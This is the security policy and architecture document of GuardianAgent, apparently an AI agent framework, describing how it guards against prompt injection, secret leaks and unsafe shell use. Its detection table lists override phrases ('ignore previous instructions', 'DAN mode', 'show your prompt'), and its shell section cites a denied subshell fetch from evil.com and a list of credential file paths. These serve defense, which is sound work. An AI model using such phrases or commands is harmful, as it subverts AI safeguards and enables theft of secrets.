# Security Policy

## Supported Versions

| Version | Supported |
|---------|-----------|
| 1.x     | Yes       |
| < 1.0   | No        |

## Reporting a Vulnerability

If you discover a security vulnerability in GuardianAgent, please report it responsibly:

1. **Do NOT** open a public GitHub issue for security vulnerabilities
2. Email security concerns to the maintainers via the repository contact
3. Include a description of the vulnerability, steps to reproduce, and potential impact
4. You will receive an acknowledgment within 48 hours
5. We aim to provide a fix or mitigation within 7 days for critical issues

---

# Security Architecture

GuardianAgent implements a **security-by-construction** architecture where all enforcement is mandatory at the runtime level. Agents cannot bypass security controls — they are enforced structurally, not by convention or optional hooks.

## Threat Model

GuardianAgent is an AI agent orchestration system where:

- **Agent code is trusted** — TypeScript classes written by the developer
- **LLM output is NOT trusted** — Models can hallucinate, leak secrets, or be prompt-injected
- **User input is NOT trusted** — External input may contain injection attempts

### Realistic Threats Addressed

| Threat | Mitigation |
|--------|-----------|
| Prompt injection | InputSanitizer with 15+ weighted signal patterns |
| Credential leakage via LLM | OutputGuardian + GuardedLLMProvider (mandatory wrapping) |
| Unauthorized file access | DeniedPathController with path normalization |
| Capability escalation | Frozen per-agent capability grants (`Object.freeze`) |
| DoS via message flooding | Per-agent sliding window rate limiting (burst/min/hour) |
| Secret exfiltration via events | Payload scanning on all inter-agent communication |
| Shell command injection | POSIX tokenizer with whitelist validation |
| LLM provider failures | CircuitBreaker + priority-based FailoverProvider |

---

## Three-Layer Defense System

GuardianAgent's security operates at every stage of the agent lifecycle through three independent defense layers.

```
┌─────────────────────────────────────────────────────────┐
│                    USER INPUT                           │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 1: Guardian Admission Pipeline (Proactive)       │
│                                                         │
│  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ InputSanitizer│→│ RateLimiter │→│ Capability    │  │
│  │ (mutating)   │  │ (validating)│  │ Controller    │  │
│  └──────────────┘  └─────────────┘  └───────────────┘  │
│         │                                    │          │
│         ▼                                    ▼          │
│  ┌──────────────┐  ┌─────────────┐  ┌───────────────┐  │
│  │ SecretScan   │→│ DeniedPath  │→│ ShellCommand  │  │
│  │ Controller   │  │ Controller  │  │ Controller    │  │
│  └──────────────┘  └─────────────┘  └───────────────┘  │
│                                                         │
│  Runs BEFORE agent.onMessage() — agent never sees       │
│  blocked input                                          │
└───────────────────────┬─────────────────────────────────┘
                        │ ✓ Allowed
                        ▼
┌─────────────────────────────────────────────────────────┐
│  AGENT EXECUTION                                        │
│                                                         │
│  Agent receives:                                        │
│  • ctx.llm = GuardedLLMProvider (NOT raw provider)      │
│  • ctx.emit() = scanned for secrets before dispatch     │
│  • ctx.capabilities = Object.freeze([...])              │
│  • ctx.checkAction() = Guardian policy check            │
│                                                         │
│  Agent does NOT have: ctx.fs, ctx.http, ctx.exec        │
│  The Runtime mediates ALL external interaction           │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 2: Output Guardian (Reactive)                    │
│                                                         │
│  Scans agent response AFTER execution, BEFORE delivery  │
│                                                         │
│  • 30+ secret patterns (AWS, GCP, Azure, GitHub, etc.)  │
│  • Redact mode: replace secrets with [REDACTED]         │
│  • Block mode: return "[Response blocked]" entirely     │
│  • Event payloads also scanned before inter-agent send  │
│                                                         │
│  GuardedLLMProvider ensures EVERY LLM call is scanned   │
│  — agents cannot bypass by using ctx.llm directly       │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  LAYER 3: Sentinel Agent (Retrospective)                │
│                                                         │
│  Autonomous agent running on cron schedule (default 5m) │
│  Analyzes AuditLog for anomalous patterns:              │
│                                                         │
│  • Volume spikes (denial rate > 3x baseline)            │
│  • Capability probing (agent denied for 5+ actions)     │
│  • Repeated secret detection (3+ per agent)             │
│  • Error storms (>10 errors in window)                  │
│  • Optional LLM-enhanced analysis                       │
└─────────────────────────────────────────────────────────┘
```

---

## Mandatory Enforcement Points

All security enforcement occurs at Runtime chokepoints. Agents cannot bypass these controls:

| Chokepoint | Enforcement | Bypass Prevention |
|------------|-------------|-------------------|
| **Message input** | Guardian pipeline runs BEFORE `agent.onMessage()` | Agent never sees blocked messages |
| **Response output** | OutputGuardian scans after execution | Response modified before delivery |
| **LLM access** | `GuardedLLMProvider` wraps real provider | Agent receives wrapped provider via `ctx.llm` |
| **Event emission** | Payload scanning in `ctx.emit()` | Only way to send inter-agent events |
| **Resource limits** | Budget/token/queue checks before invocation | Runtime rejects over-limit requests |
| **Lifecycle gating** | Dead/Errored/Stalled agents cannot receive work | `assertExecutable()` guard |
| **Context immutability** | `Object.freeze()` on agent contexts | Agents cannot modify capabilities |

---

## Secret Detection

### Built-in Patterns (30+)

| Category | Patterns Detected |
|----------|------------------|
| **AWS** | Access Key (`AKIA...`), Secret Key, Session Token |
| **GCP / Google** | Service Account JSON, AI API Key (`AIza...`) |
| **Azure** | Storage Account Key (connection string) |
| **GitHub** | PAT (`ghp_`), OAuth (`gho_`), App Token (`ghs_`, `ghr_`) |
| **GitLab** | PAT (`glpat-`), Pipeline Token (`glptt-`) |
| **OpenAI** | API Key (`sk-proj-`, `sk-...`) |
| **Anthropic** | API Key (`sk-ant-...`) |
| **Stripe** | Live Key (`sk_live_`), Test Key (`sk_test_`) |
| **Slack** | Bot Token (`xoxb-`), Webhook URL |
| **Twilio** | API Key (`SK` + 32 hex) |
| **SendGrid** | API Key (`SG.<22>.<43>`) |
| **Telegram** | Bot Token |
| **npm** | Token (`npm_`) |
| **Infrastructure** | Heroku API Key, Mailgun Key |
| **Tokens/Certs** | JWT (`eyJ...`), PEM Private Key headers, Connection Strings |
| **PII** | Email addresses, US SSN, Credit Card numbers, US Phone numbers |
| **Generic** | `password=`, `api_key=`, `secret=`, `token=` patterns |

### Denied File Paths (13 patterns)

`.env`, `*.pem`, `*.key`, `credentials.*`, `id_rsa*`, SSH keys, `*.p12`/`*.pfx`, `*.jks`, `.npmrc`, `*.tfvars`, `*.tfstate`, `docker-compose*.yml`, `kubeconfig`

---

## Prompt Injection Defense

The InputSanitizer operates as a mutating admission controller with two defenses:

### 1. Invisible Character Stripping

Removes Unicode characters that can hide instructions:
- Zero-width joiners/spaces (U+200B–200F)
- Bidi markers (U+202A–202E)
- Word joiners, isolate markers (U+2060–2069)
- BOM (U+FEFF), soft hyphens (U+00AD)

### 2. Injection Signal Detection (15+ patterns)

| Category | Examples | Score |
|----------|----------|-------|
| Role override | "ignore previous instructions", "you are now" | 2–3 |
| Delimiter injection | `system:`, `assistant:`, code fence system | 1–3 |
| Instruction override | "new instructions:", "override all settings" | 3 |
| Jailbreak | "DAN mode", "developer mode" | 2–3 |
| Data exfiltration | "repeat all above", "show your prompt" | 2 |

Scores are additive. Default block threshold: **3** (configurable).

---

## Per-Agent Capability Model

Capabilities are granted per-agent at registration and **frozen** (`Object.freeze`). Agents structurally cannot access capabilities they weren't granted.

### Available Capabilities

| Capability | Grants Access To |
|-----------|-----------------|
| `read_files` | File read operations |
| `write_files` | File write/create operations |
| `execute_commands` | Shell command execution |
| `network_access` | HTTP requests to allowed domains |
| `read_email` | Email inbox access |
| `draft_email` | Email composition |
| `send_email` | Email sending |
| `git_operations` | Git commands |
| `install_packages` | Package installation |

### Trust Presets

One-knob security posture configuration:

| Preset | Capabilities | Rate Limit | Budget | Tool Policy |
|--------|-------------|------------|--------|-------------|
| **locked** | read_files only | 10/min, 100/hr | 15s | approve_each |
| **safe** | read_files, read_email | 20/min, 300/hr | 30s | approve_by_policy |
| **balanced** | read/write/exec/git/email | 30/min, 500/hr | 60s | approve_by_policy |
| **power** | all capabilities | 60/min, 2000/hr | 300s | autonomous |

---

## Tool Execution Security

### Three-Tier Approval Policy

| Mode | Behavior |
|------|----------|
| `approve_each` | Every tool call requires explicit user approval |
| `approve_by_policy` | Per-tool overrides: `auto`, `policy`, `manual`, `deny` |
| `autonomous` | Tools execute without approval (still sandboxed) |

### Risk Classification

| Risk Level | Examples |
|-----------|---------|
| `read_only` | File reads, searches |
| `mutating` | File writes, deletes |
| `network` | HTTP requests, downloads |
| `external_post` | Sending emails, posting to forums |

### Sandbox Restrictions

- **Path whitelist**: Tools can only access configured filesystem roots
- **Command whitelist**: Shell execution limited to explicitly allowed commands
- **Domain whitelist**: Network requests limited to configured domains
- **Dry-run mode**: Preview mutating operations without execution

---

## Tamper-Evident Audit Trail

### Hash-Chained JSONL

Every security event is persisted to `~/.guardianagent/audit/audit.jsonl` with SHA-256 hash chaining:

```
{ event: {...}, previousHash: "abc123...", hash: "def456..." }
```

Each entry's hash is computed over the event + previous hash, creating a **tamper-evident chain**. Any modification to historical entries breaks the chain.

### Chain Verification

```typescript
const result = await auditLog.verifyChain();
// { valid: true, totalEntries: 1523 }
```

Available via `GET /api/audit/verify` endpoint.

### Event Types (12)

| Event | Severity | Description |
|-------|----------|-------------|
| `action_denied` | warn | Guardian blocked an action |
| `action_allowed` | info | Action passed Guardian check |
| `secret_detected` | warn/critical | Secret found in content |
| `output_blocked` | warn | LLM response blocked entirely |
| `output_redacted` | warn | Secrets redacted from response |
| `event_blocked` | warn | Inter-agent event blocked |
| `input_sanitized` | info | Invisible chars stripped |
| `rate_limited` | warn | Rate limit triggered |
| `capability_probe` | warn | Agent probed beyond capabilities |
| `anomaly_detected` | warn/critical | Sentinel detected anomaly |
| `agent_error` | warn | Agent execution error |
| `agent_stalled` | warn | Agent stall detected |

---

## Resource Governance

### Per-Agent Limits

| Resource | Default | Purpose |
|----------|---------|---------|
| `maxInvocationBudgetMs` | 300,000ms (5min) | Wall-clock timeout per invocation |
| `maxTokensPerMinute` | 0 (unlimited) | LLM token rate limiting |
| `maxConcurrentTools` | 0 (unlimited) | Parallel tool execution cap |
| `maxQueueDepth` | 1,000 | Event queue backpressure |

### Stall Detection & Recovery

- **Watchdog** monitors agent activity timestamps
- Stall threshold: configurable (default 180s)
- Error recovery: exponential backoff [30s, 1m, 5m, 15m, 60m]
- After 5 consecutive failures → agent transitions to `Dead` state

### LLM Resilience

- **CircuitBreaker**: Per-provider failure tracking (closed → open → half-open)
- **FailoverProvider**: Priority-based provider chain with automatic fallback
- Token usage tracked per-agent for rate limiting

---

## Shell Command Validation

The ShellCommandController goes beyond simple string matching:

1. **POSIX tokenizer** handles quoting (`echo "hello && world"` → one command)
2. **Chain splitting** on `&&`, `||`, `;`, `|` operators
3. **Each sub-command** validated against whitelist
4. **Redirect targets** (`> .env`) checked against denied paths
5. **Subshell detection** (`$(curl evil.com)`) → denied
6. **Deny by default** if parser can't fully understand the input

---

## Web Channel Security

| Feature | Implementation |
|---------|---------------|
| **Authentication** | Bearer token (required by default) |
| **Token rotation** | Optional auto-rotation on startup |
| **CORS** | Configurable allowed origins |
| **Request limits** | Configurable max body size (default 1MB) |
| **Auth modes** | `bearer_required`, `localhost_no_auth`, `disabled` |
| **SSE** | Server-Sent Events for real-time updates |

---

## Orchestration Security

Multi-agent orchestration (Sequential, Parallel, Loop agents) maintains security invariants:

- All sub-agent invocations go through `Runtime.dispatchMessage()`
- Each sub-agent call passes through the full Guardian admission pipeline
- Shared state between agents is scoped and cleaned between runs
- Orchestration agents receive `ctx.dispatch()` — a guarded wrapper, not raw runtime access

---

## Design Principles

### Meta's Rule of Two

An agent should satisfy **at most two** of:
1. Processing untrusted inputs (user content, web pages)
2. Accessing sensitive data (credentials, .env files)
3. Changing state / communicating externally (shell commands, API calls)

### Security by Construction vs Convention

| Approach | GuardianAgent | Typical Frameworks |
|----------|--------------|-------------------|
| Output scanning | **Mandatory** (GuardedLLMProvider) | Optional callback |
| Capability enforcement | **Frozen grants** (Object.freeze) | Runtime checks |
| Admission pipeline | **Inline in Runtime** | Plugin/middleware |
| Audit logging | **Automatic** for all security events | Manual instrumentation |
| Context isolation | **Object.freeze** on agent context | Documentation only |

---

## Configuration

All security features are configurable in `~/.guardianagent/config.yaml`:

```yaml
guardian:
  enabled: true
  logDenials: true
  trustPreset: balanced          # locked | safe | balanced | power

  inputSanitization:
    enabled: true
    blockThreshold: 3

  rateLimit:
    maxPerMinute: 30
    maxPerHour: 500
    burstAllowed: 5

  outputScanning:
    enabled: true
    redactSecrets: true          # false = block entire response

  sentinel:
    enabled: true
    schedule: '*/5 * * * *'

  auditLog:
    maxEvents: 10000
    persistenceEnabled: true
```

---

## Extensibility

### Custom Admission Controllers

```typescript
guardian.use({
  name: 'MyController',
  phase: 'validating',
  check: (action) => {
    if (action.params.blocked) {
      return { allowed: false, reason: 'Custom denial', controller: 'MyController' };
    }
    return null; // pass through
  },
});
```

### Custom Secret Patterns

```yaml
guardian:
  additionalSecretPatterns:
    - 'MYTOKEN_[A-Za-z0-9]{32}'
```

### Custom Denied Paths

```yaml
guardian:
  deniedPaths:
    - '\\.secrets$'
    - 'internal/keys/'
```
